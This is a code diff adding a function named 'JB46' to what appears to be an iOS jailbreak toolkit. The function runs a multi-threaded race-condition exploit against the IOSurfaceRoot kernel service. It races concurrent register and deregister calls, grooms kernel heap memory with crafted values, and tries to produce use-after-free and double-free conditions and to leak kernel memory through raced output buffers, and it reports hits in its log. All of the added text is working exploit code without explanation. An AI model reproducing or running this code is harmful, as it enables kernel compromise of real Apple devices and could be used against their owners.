@@ -37542,3 +37542,383 @@ void iosurface_deep_selector_exploit(ISRLogBlock log, ISRDoneBlock done) {
         done(results);
     });
 }
+
+#pragma mark - JB46: Multi-threaded Race Condition UAF Exploitation
+
+void iosurface_race_exploit(ISRLogBlock log, ISRDoneBlock done) {
+    dispatch_async(dispatch_get_global_queue(0, 0), ^{
+        log(@"JB46: === Multi-threaded Race Condition UAF Exploitation ===");
+        log(@"JB46: Strategy: GCD concurrent races on register/deregister/dup");
+
+        NSMutableDictionary *results = [NSMutableDictionary dictionary];
+        results[@"probe"] = @"JB46";
+
+        typedef void*(*matching_fn)(const char*);
+        typedef unsigned int(*getmatch_fn)(unsigned int, void*);
+        typedef int(*svcopen_fn)(unsigned int, unsigned int, unsigned int, unsigned int*);
+        typedef int(*svcclose_fn)(unsigned int);
+        typedef int(*callmethod_fn)(unsigned int, uint32_t, const uint64_t*, uint32_t, const void*, size_t, uint64_t*, uint32_t*, void*, size_t*);
+        typedef int(*callasync_fn)(unsigned int, uint32_t, unsigned int, uint64_t*, uint32_t, const uint64_t*, uint32_t, const void*, size_t, void*, uint32_t*, uint64_t*, uint32_t*);
+        typedef int(*objrelease_fn)(unsigned int);
+        typedef void*(*surfcreate_fn)(void*);
+        typedef uint32_t(*surfgetid_fn)(void*);
+        typedef void(*surfsetval_fn)(void*, CFStringRef, CFTypeRef);
+
+        matching_fn sym_matching = (matching_fn)dlsym(RTLD_DEFAULT, "IOServiceMatching");
+        getmatch_fn sym_getmatch = (getmatch_fn)dlsym(RTLD_DEFAULT, "IOServiceGetMatchingService");
+        svcopen_fn sym_open = (svcopen_fn)dlsym(RTLD_DEFAULT, "IOServiceOpen");
+        svcclose_fn sym_close = (svcclose_fn)dlsym(RTLD_DEFAULT, "IOServiceClose");
+        callmethod_fn sym_call = (callmethod_fn)dlsym(RTLD_DEFAULT, "IOConnectCallMethod");
+        callasync_fn sym_async = (callasync_fn)dlsym(RTLD_DEFAULT, "IOConnectCallAsyncMethod");
+        objrelease_fn sym_release = (objrelease_fn)dlsym(RTLD_DEFAULT, "IOObjectRelease");
+        surfcreate_fn sym_surfcreate = (surfcreate_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+        surfgetid_fn sym_surfgetid = (surfgetid_fn)dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
+        surfsetval_fn sym_surfsetval = (surfsetval_fn)dlsym(RTLD_DEFAULT, "IOSurfaceSetValue");
+
+        if (!sym_matching || !sym_getmatch || !sym_open || !sym_close || !sym_call || !sym_async) {
+            log(@"JB46: FAIL — dlsym IOKit missing");
+            results[@"verdict"] = @"DLSYM_FAIL";
+            done(results);
+            return;
+        }
+
+        void *dict = sym_matching("IOSurfaceRoot");
+        unsigned int svc = sym_getmatch(0, dict);
+        if (!svc) {
+            log(@"JB46: FAIL — IOSurfaceRoot not found");
+            results[@"verdict"] = @"NO_SERVICE";
+            done(results);
+            return;
+        }
+        log([NSString stringWithFormat:@"JB46: IOSurfaceRoot svc=0x%x", svc]);
+
+        dispatch_queue_t raceQ = dispatch_queue_create("jb46.race", DISPATCH_QUEUE_CONCURRENT);
+        int i1Anomalies = 0;
+        int i2DoubleFree = 0;
+        int i3RaceHits = 0;
+        int i4SurfRaceHits = 0;
+        int i5BytesWritten = 0;
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; if (sym_release) sym_release(svc); done(results); return; }
+
+        log(@"JB46: ========== I1: GCD Race — Concurrent Deregister + Dup ==========");
+        {
+            unsigned int oConn = 0, gConn = 0;
+            sym_open(svc, mach_task_self(), 0, &oConn);
+            sym_open(svc, mach_task_self(), 0, &gConn);
+            if (oConn && gConn) {
+                for (int trial = 0; trial < 20 && !isr_stopped(); trial++) {
+                    unsigned int wp = jb41_newWakePort();
+                    if (!wp) continue;
+                    uint64_t in[3] = {(uint64_t)trial + 0x5000, 0, 0};
+                    int reg = jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
+                    if (reg != 0) {
+                        jb41_dropPort(wp);
+                        continue;
+                    }
+                    __block volatile int deregDone = 0;
+                    __block volatile int anomalyCount = 0;
+                    __block volatile uint32_t anomalyCode = 0;
+                    dispatch_group_t grp = dispatch_group_create();
+                    dispatch_group_async(grp, raceQ, ^{
+                        uint64_t din[3] = {(uint64_t)trial + 0x5000, 0, 0};
+                        jb41_callSel(oConn, 18, din, 24, 0, wp, sym_call, sym_async);
+                        unsigned int gPorts[512];
+                        int gCount = 0;
+                        jb42_groomWithFields(gConn, 0x41414141, 0xDEAD0046, 0xFFFFFF8000000000ULL, 0xBBBBBBBB, 24, 256, gPorts, &gCount, sym_async);
+                        deregDone = 1;
+                        jb42_freeGroom(gPorts, gCount);
+                    });
+                    dispatch_group_async(grp, raceQ, ^{
+                        for (int r = 0; r < 50; r++) {
+                            uint64_t rin[3] = {(uint64_t)trial + 0x5000, 0, 0};
+                            int dupRc = jb41_callSel(oConn, 17, rin, 24, 1, wp, sym_call, sym_async);
+                            uint32_t rc32 = (uint32_t)dupRc;
+                            if (rc32 != 0xE00002C9 && rc32 != 0 && rc32 != 0xE00002C2) {
+                                anomalyCount++;
+                                anomalyCode = rc32;
+                            }
+                            if (deregDone) break;
+                        }
+                    });
+                    long waited = dispatch_group_wait(grp, dispatch_time(DISPATCH_TIME_NOW, 2LL * NSEC_PER_SEC));
+                    if (waited != 0) {
+                        log([NSString stringWithFormat:@"JB46: [I1] trial=%d TIMEOUT", trial]);
+                    }
+                    if (anomalyCount > 0) {
+                        i1Anomalies += anomalyCount;
+                        log([NSString stringWithFormat:@"JB46: [I1] trial=%d ANOMALY count=%d code=0x%x", trial, anomalyCount, anomalyCode]);
+                    }
+                    jb41_callSel(oConn, 18, in, 24, 0, wp, sym_call, sym_async);
+                    jb41_dropPort(wp);
+                }
+                sym_close(oConn);
+                sym_close(gConn);
+            }
+        }
+        results[@"i1_anomalies"] = @(i1Anomalies);
+        log([NSString stringWithFormat:@"JB46: [I1] total anomalies: %d", i1Anomalies]);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; if (sym_release) sym_release(svc); done(results); return; }
+
+        log(@"JB46: ========== I2: Double-Deregister Race ==========");
+        {
+            unsigned int oConn = 0, gConn = 0;
+            sym_open(svc, mach_task_self(), 0, &oConn);
+            sym_open(svc, mach_task_self(), 0, &gConn);
+            if (oConn && gConn) {
+                for (int trial = 0; trial < 10 && !isr_stopped(); trial++) {
+                    unsigned int wp = jb41_newWakePort();
+                    if (!wp) continue;
+                    uint64_t in[3] = {(uint64_t)trial + 0x6000, 0, 0};
+                    int reg = jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
+                    if (reg != 0) {
+                        jb41_dropPort(wp);
+                        continue;
+                    }
+                    __block volatile int dr1 = -1;
+                    __block volatile int dr2 = -1;
+                    dispatch_group_t grp = dispatch_group_create();
+                    dispatch_group_async(grp, raceQ, ^{
+                        uint64_t din[3] = {(uint64_t)trial + 0x6000, 0, 0};
+                        dr1 = jb41_callSel(oConn, 18, din, 24, 0, wp, sym_call, sym_async);
+                    });
+                    dispatch_group_async(grp, raceQ, ^{
+                        uint64_t din[3] = {(uint64_t)trial + 0x6000, 0, 0};
+                        dr2 = jb41_callSel(oConn, 18, din, 24, 0, wp, sym_call, sym_async);
+                    });
+                    dispatch_group_wait(grp, dispatch_time(DISPATCH_TIME_NOW, 2LL * NSEC_PER_SEC));
+                    int bothOk = ((uint32_t)dr1 == 0 && (uint32_t)dr2 == 0) ? 1 : 0;
+                    if (bothOk) {
+                        i2DoubleFree++;
+                        unsigned int gPorts[512];
+                        int gCount = 0;
+                        jb42_groomWithFields(gConn, 0x42424242, 0xDEAD0046, 0xCCCCCCCC, 0xDDDDDDDD, 24, 256, gPorts, &gCount, sym_async);
+                        uint64_t dupIn[3] = {(uint64_t)trial + 0x6000, 0, 0};
+                        int dupRc = jb41_callSel(oConn, 17, dupIn, 24, 1, wp, sym_call, sym_async);
+                        log([NSString stringWithFormat:@"JB46: [I2] trial=%d DOUBLE-FREE dr1=0x%x dr2=0x%x dup=0x%x", trial, (uint32_t)dr1, (uint32_t)dr2, (uint32_t)dupRc]);
+                        jb42_freeGroom(gPorts, gCount);
+                    } else {
+                        log([NSString stringWithFormat:@"JB46: [I2] trial=%d dr1=0x%x dr2=0x%x", trial, (uint32_t)dr1, (uint32_t)dr2]);
+                    }
+                    jb41_callSel(oConn, 18, in, 24, 0, wp, sym_call, sym_async);
+                    jb41_dropPort(wp);
+                }
+                sym_close(oConn);
+                sym_close(gConn);
+            }
+        }
+        results[@"i2_doubleFree"] = @(i2DoubleFree);
+        log([NSString stringWithFormat:@"JB46: [I2] double-free hits: %d", i2DoubleFree]);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; if (sym_release) sym_release(svc); done(results); return; }
+
+        log(@"JB46: ========== I3: Register-During-Groom Race ==========");
+        {
+            unsigned int oConn = 0, gConn = 0;
+            sym_open(svc, mach_task_self(), 0, &oConn);
+            sym_open(svc, mach_task_self(), 0, &gConn);
+            if (oConn && gConn) {
+                for (int trial = 0; trial < 10 && !isr_stopped(); trial++) {
+                    unsigned int wp = jb41_newWakePort();
+                    if (!wp) continue;
+                    uint64_t in[3] = {(uint64_t)trial + 0x7000, 0, 0};
+                    int reg = jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
+                    if (reg != 0) { jb41_dropPort(wp); continue; }
+                    jb41_callSel(oConn, 18, in, 24, 0, wp, sym_call, sym_async);
+                    __block volatile int regRc = -1;
+                    __block volatile int groomDone = 0;
+                    unsigned int *gPorts = (unsigned int *)calloc(512, sizeof(unsigned int));
+                    __block int gCount = 0;
+                    dispatch_group_t grp = dispatch_group_create();
+                    dispatch_group_async(grp, raceQ, ^{
+                        jb42_groomWithFields(gConn, 0x43434343, 0xDEAD0046, 0xEEEEEEEE, 0xFFFFFFFF, 24, 256, gPorts, &gCount, sym_async);
+                        groomDone = 1;
+                    });
+                    dispatch_group_async(grp, raceQ, ^{
+                        uint64_t rin[3] = {(uint64_t)trial + 0x7000, 0, 0};
+                        regRc = jb41_callSel(oConn, 17, rin, 24, 1, wp, sym_call, sym_async);
+                    });
+                    dispatch_group_wait(grp, dispatch_time(DISPATCH_TIME_NOW, 2LL * NSEC_PER_SEC));
+                    uint64_t dupIn[3] = {(uint64_t)trial + 0x7000, 0, 0};
+                    int dupRc = jb41_callSel(oConn, 17, dupIn, 24, 1, wp, sym_call, sym_async);
+                    uint32_t dupCode = (uint32_t)dupRc;
+                    if (dupCode != 0xE00002C9 && dupCode != 0) {
+                        i3RaceHits++;
+                        log([NSString stringWithFormat:@"JB46: [I3] trial=%d HIT regRc=0x%x dup=0x%x", trial, (uint32_t)regRc, dupCode]);
+                    } else {
+                        log([NSString stringWithFormat:@"JB46: [I3] trial=%d regRc=0x%x dup=0x%x", trial, (uint32_t)regRc, dupCode]);
+                    }
+                    jb41_callSel(oConn, 18, in, 24, 0, wp, sym_call, sym_async);
+                    jb42_freeGroom(gPorts, gCount);
+                    free(gPorts);
+                    jb41_dropPort(wp);
+                }
+                sym_close(oConn);
+                sym_close(gConn);
+            }
+        }
+        results[@"i3_raceHits"] = @(i3RaceHits);
+        log([NSString stringWithFormat:@"JB46: [I3] race hits: %d", i3RaceHits]);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; if (sym_release) sym_release(svc); done(results); return; }
+
+        log(@"JB46: ========== I4: Concurrent Surface Create + Registry Race ==========");
+        {
+            unsigned int oConn = 0, gConn = 0;
+            sym_open(svc, mach_task_self(), 0, &oConn);
+            sym_open(svc, mach_task_self(), 0, &gConn);
+            if (oConn && gConn && sym_surfcreate) {
+                typedef void(*cfrel_fn)(CFTypeRef);
+                cfrel_fn sym_cfrelease = (cfrel_fn)dlsym(RTLD_DEFAULT, "CFRelease");
+                for (int trial = 0; trial < 10 && !isr_stopped(); trial++) {
+                    unsigned int wp = jb41_newWakePort();
+                    if (!wp) continue;
+                    __block volatile int surfLoopStop = 0;
+                    __block volatile int anomalyHit = 0;
+                    __block volatile uint32_t anomalyVal = 0;
+                    dispatch_group_t grp = dispatch_group_create();
+                    dispatch_group_async(grp, raceQ, ^{
+                        while (!surfLoopStop) {
+                            NSDictionary *sp = @{@"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64, @"IOSurfaceBytesPerElement": @4, @"IOSurfacePixelFormat": @(0x42475241)};
+                            void *s = sym_surfcreate((__bridge void *)sp);
+                            if (s && sym_surfsetval) {
+                                sym_surfsetval(s, CFSTR("JB46race"), (__bridge CFTypeRef)@(trial));
+                            }
+                            if (s && sym_cfrelease) {
+                                sym_cfrelease((CFTypeRef)s);
+                            }
+                        }
+                    });
+                    dispatch_group_async(grp, raceQ, ^{
+                        for (int r = 0; r < 5; r++) {
+                            uint64_t in4[3] = {(uint64_t)trial + 0x8000, 0, 0};
+                            int reg4 = jb41_callSel(oConn, 17, in4, 24, 1, wp, sym_call, sym_async);
+                            if (reg4 != 0) continue;
+                            jb41_callSel(oConn, 18, in4, 24, 0, wp, sym_call, sym_async);
+                            unsigned int gPorts4[512];
+                            int gCount4 = 0;
+                            jb42_groomWithFields(gConn, 0x44444444, 0xDEAD0046, 0xAAAAAAAA, 0x55555555, 24, 128, gPorts4, &gCount4, sym_async);
+                            uint64_t dupIn4[3] = {(uint64_t)trial + 0x8000, 0, 0};
+                            int dup4 = jb41_callSel(oConn, 17, dupIn4, 24, 1, wp, sym_call, sym_async);
+                            uint32_t dc4 = (uint32_t)dup4;
+                            if (dc4 != 0xE00002C9 && dc4 != 0 && dc4 != 0xE00002C2) {
+                                anomalyHit = 1;
+                                anomalyVal = dc4;
+                            }
+                            jb41_callSel(oConn, 18, dupIn4, 24, 0, wp, sym_call, sym_async);
+                            jb42_freeGroom(gPorts4, gCount4);
+                        }
+                        surfLoopStop = 1;
+                    });
+                    dispatch_group_wait(grp, dispatch_time(DISPATCH_TIME_NOW, 3LL * NSEC_PER_SEC));
+                    surfLoopStop = 1;
+                    if (anomalyHit) {
+                        i4SurfRaceHits++;
+                        log([NSString stringWithFormat:@"JB46: [I4] trial=%d ANOMALY code=0x%x", trial, anomalyVal]);
+                    } else {
+                        log([NSString stringWithFormat:@"JB46: [I4] trial=%d normal", trial]);
+                    }
+                    jb41_dropPort(wp);
+                }
+                sym_close(oConn);
+                sym_close(gConn);
+            } else {
+                log(@"JB46: [I4] SKIP — IOSurfaceCreate not available");
+            }
+        }
+        results[@"i4_surfRaceHits"] = @(i4SurfRaceHits);
+        log([NSString stringWithFormat:@"JB46: [I4] surface race hits: %d", i4SurfRaceHits]);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; if (sym_release) sym_release(svc); done(results); return; }
+
+        log(@"JB46: ========== I5: Output Buffer Size Sweep with Race ==========");
+        {
+            unsigned int oConn = 0, gConn = 0;
+            sym_open(svc, mach_task_self(), 0, &oConn);
+            sym_open(svc, mach_task_self(), 0, &gConn);
+            if (oConn && gConn) {
+                int sizes[] = {8, 16, 24, 32, 48, 64, 128, 256};
+                int numSizes = 8;
+                for (int si = 0; si < numSizes && !isr_stopped(); si++) {
+                    int outSz = sizes[si];
+                    unsigned int wp = jb41_newWakePort();
+                    if (!wp) continue;
+                    uint64_t in[3] = {(uint64_t)si + 0x9000, 0, 0};
+                    int reg = jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
+                    if (reg != 0) { jb41_dropPort(wp); continue; }
+                    __block volatile int raceDone = 0;
+                    __block volatile int localHits = 0;
+                    unsigned int *gPorts5 = (unsigned int *)calloc(512, sizeof(unsigned int));
+                    __block int gCount5 = 0;
+                    dispatch_group_t grp = dispatch_group_create();
+                    dispatch_group_async(grp, raceQ, ^{
+                        uint64_t din[3] = {(uint64_t)si + 0x9000, 0, 0};
+                        jb41_callSel(oConn, 18, din, 24, 0, wp, sym_call, sym_async);
+                        jb42_groomWithFields(gConn, 0x45454545, 0xDEAD0046, 0xFFFFFF8012340000ULL, 0x99999999, 24, 256, gPorts5, &gCount5, sym_async);
+                        raceDone = 1;
+                    });
+                    dispatch_group_async(grp, raceQ, ^{
+                        while (!raceDone) {
+                            uint8_t outBuf[256];
+                            memset(outBuf, 0xCC, sizeof(outBuf));
+                            size_t oSz = (size_t)outSz;
+                            uint64_t outScalar[4] = {0};
+                            uint32_t outScalarCnt = 4;
+                            uint64_t rin[3] = {(uint64_t)si + 0x9000, 0, 0};
+                            int rc = jb42_callSelWithOutput(oConn, 17, rin, 24, 1, wp, outScalar, &outScalarCnt, outBuf, &oSz, sym_call, sym_async);
+                            int changed = 0;
+                            for (int b = 0; b < outSz && b < 256; b++) {
+                                if (outBuf[b] != 0xCC) { changed = 1; break; }
+                            }
+                            if (changed) {
+                                localHits++;
+                            }
+                            (void)rc;
+                        }
+                    });
+                    dispatch_group_wait(grp, dispatch_time(DISPATCH_TIME_NOW, 2LL * NSEC_PER_SEC));
+                    raceDone = 1;
+                    i5BytesWritten += localHits;
+                    if (localHits > 0) {
+                        log([NSString stringWithFormat:@"JB46: [I5] outSz=%d DATA WRITTEN", outSz]);
+                    } else {
+                        log([NSString stringWithFormat:@"JB46: [I5] outSz=%d no data", outSz]);
+                    }
+                    jb41_callSel(oConn, 18, in, 24, 0, wp, sym_call, sym_async);
+                    jb42_freeGroom(gPorts5, gCount5);
+                    free(gPorts5);
+                    jb41_dropPort(wp);
+                }
+                sym_close(oConn);
+                sym_close(gConn);
+            }
+        }
+        results[@"i5_bytesWritten"] = @(i5BytesWritten);
+        log([NSString stringWithFormat:@"JB46: [I5] bytes written hits: %d", i5BytesWritten]);
+
+        if (sym_release) sym_release(svc);
+
+        NSString *verdict;
+        if (i5BytesWritten > 0) {
+            verdict = @"DATA_EXTRACTED";
+            log(@"JB46: [!!!!!] Data extracted via raced output buffer sweep!");
+        } else if (i2DoubleFree > 0) {
+            verdict = @"DOUBLE_FREE";
+            log([NSString stringWithFormat:@"JB46: [!!!!] Double-free achieved %d times", i2DoubleFree]);
+        } else if (i1Anomalies > 0 || i3RaceHits > 0 || i4SurfRaceHits > 0) {
+            verdict = @"RACE_CONFIRMED";
+            log([NSString stringWithFormat:@"JB46: [!!!] Race effects: i1=%d i3=%d i4=%d", i1Anomalies, i3RaceHits, i4SurfRaceHits]);
+        } else {
+            verdict = @"NO_RACE_EFFECT";
+            log(@"JB46: No race effects detected — kernel serializes access");
+        }
+
+        results[@"verdict"] = verdict;
+        log([NSString stringWithFormat:@"JB46: Verdict: %@", verdict]);
+        log(@"JB46: =============================================");
+
+        isr_checkpoint(@"JB46-race-checkpoint.json", results);
+        done(results);
+    });
+}
